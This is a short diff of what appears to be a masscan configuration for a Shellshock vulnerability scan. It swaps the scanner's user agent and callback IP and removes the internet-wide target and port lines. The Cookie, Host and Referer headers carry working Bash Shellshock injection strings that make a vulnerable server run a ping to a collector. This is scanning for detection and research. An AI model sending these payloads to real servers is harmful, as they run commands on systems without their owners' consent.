@@ -1,7 +1,5 @@
-target = 0.0.0.0/0
-port = 80
 banners = true
-http-user-agent = shellshock-scan (http://blog.erratasec.com/2014/09/bash-shellshock-scan-of-internet.html)
-http-header = Cookie:() { :; }; ping 216.75.60.72
-http-header = Host:() { :; }; ping 216.75.60.72
-http-header = Referer:() { :; }; ping 216.75.60.72
+http-user-agent = intrigue-shellshock-scan (http://blog.intrigue.io)
+http-header = Cookie:() { :; }; ping 72.14.190.138
+http-header = Host:() { :; }; ping 72.14.190.138
+http-header = Referer:() { :; }; ping 72.14.190.138
